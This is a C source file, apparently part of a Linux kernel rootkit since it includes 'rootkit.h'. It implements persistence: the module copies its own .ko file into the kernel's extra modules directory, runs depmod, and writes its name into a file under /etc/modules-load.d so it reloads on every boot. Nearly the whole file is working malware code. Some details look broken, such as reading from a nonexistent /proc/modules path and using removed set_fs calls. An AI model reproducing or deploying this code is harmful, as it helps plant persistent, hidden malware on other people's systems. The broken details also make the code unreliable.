#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "rootkit.h"

/* Déplace le fichier .ko vers /lib/modules/$(uname -r)/extra/ */
static int move_module_file(void)
{
    struct file *src, *dst;
    mm_segment_t old_fs;
    char *src_path, *dst_path;
    char *kernel_version;
    char buffer[4096];
    int ret = 0;
    ssize_t bytes;

    /* Obtenir la version du noyau */
    kernel_version = utsname()->release;

    /* Construction du chemin source basé sur THIS_MODULE */
    src_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!src_path) {
        return -ENOMEM;
    }
    snprintf(src_path, PATH_MAX, "/proc/modules/%s.ko", THIS_MODULE->name);

    /* Construction du chemin de destination */
    dst_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!dst_path) {
        kfree(src_path);
        return -ENOMEM;
    }
    snprintf(dst_path, PATH_MAX, "/lib/modules/%s/extra/%s.ko", kernel_version, THIS_MODULE->name);

    /* Ouvrir les fichiers source et destination */
    src = filp_open(src_path, O_RDONLY, 0);
    dst = filp_open(dst_path, O_WRONLY | O_CREAT, 0644);
    if (IS_ERR(src) || IS_ERR(dst)) {
        ret = -ENOENT;
        goto out;
    }

    /* Copier le contenu du fichier .ko */
    old_fs = get_fs();
    set_fs(KERNEL_DS);

    while ((bytes = kernel_read(src, buffer, sizeof(buffer), &src->f_pos)) > 0) {
        kernel_write(dst, buffer, bytes, &dst->f_pos);
    }

    set_fs(old_fs);

out:
    /* Fermeture des fichiers et libération de la mémoire */
    if (!IS_ERR(src))
        filp_close(src, NULL);
    if (!IS_ERR(dst))
        filp_close(dst, NULL);

    kfree(src_path);
    kfree(dst_path);

    return ret;
}

/* Fonction pour lire le fichier de configuration et vérifier la présence du module */
static int is_module_in_file(const char *path, const char *module_name)
{
    struct file *file;
    mm_segment_t old_fs;
    char *buf;
    int ret = 0;

    /* Allocation de mémoire pour le tampon de lecture */
    buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!buf) {
        return -ENOMEM;
    }

    file = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(file)) {
        kfree(buf);
        return 0; // Retourne 0 si le fichier n'existe pas, persistance non présente
    }

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    /* Lecture du fichier */
    ret = kernel_read(file, buf, PAGE_SIZE - 1, &file->f_pos);
    if (ret > 0) {
        buf[ret] = '\0';
        if (strstr(buf, module_name)) {
            ret = 1;  // Le module est déjà présent
        } else {
            ret = 0;  // Le module n'est pas présent
        }
    }

    set_fs(old_fs);
    filp_close(file, NULL);
    kfree(buf);  // Libération de la mémoire allouée pour le tampon

    return ret;
}

/* Fonction pour écrire le nom du module dans un fichier */
static int write_to_file(const char *path, const char *data)
{
    struct file *file;
    mm_segment_t old_fs;
    int ret = 0;

    file = filp_open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(file)) {
        return PTR_ERR(file);
    }

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    ret = kernel_write(file, data, strlen(data), &file->f_pos);

    set_fs(old_fs);
    filp_close(file, NULL);

    return ret < 0 ? ret : 0;
}

/* Fonction principale pour activer la persistance */
int enable_persistence(const char *module_name)
{
    const char *dir_path = "/etc/modules-load.d";
    char *file_path;
    int ret;

    /* Déplacer le module vers le répertoire standard */
    ret = move_module_file();
    if (ret < 0) {
        return ret;
    }

    /* Exécuter depmod pour mettre à jour la base de données des modules */
    call_usermodehelper("/sbin/depmod", NULL, NULL, UMH_WAIT_PROC);

    /* Allocation mémoire pour le chemin du fichier avec le nom du module */
    file_path = kmalloc(strlen(dir_path) + strlen(module_name) + 6, GFP_KERNEL); // Taille pour ajouter "/" et ".conf" 
    if (!file_path) {
        return -ENOMEM;
    }

    /* Construction du chemin complet du fichier, ex: /etc/modules-load.d/module_name.conf */
    snprintf(file_path, strlen(dir_path) + strlen(module_name) + 6, "%s/%s.conf", dir_path, module_name);

    /* Vérifie si le module est déjà présent dans le fichier */
    if (is_module_in_file(file_path, module_name)) {
        kfree(file_path);  // Libération de la mémoire allouée pour file_path
        return 0;  // La persistance est déjà présente
    }

    /* Écriture dans le fichier de configuration */
    ret = write_to_file(file_path, module_name);
    kfree(file_path);  // Libération de la mémoire allouée pour file_path

    return ret;
}
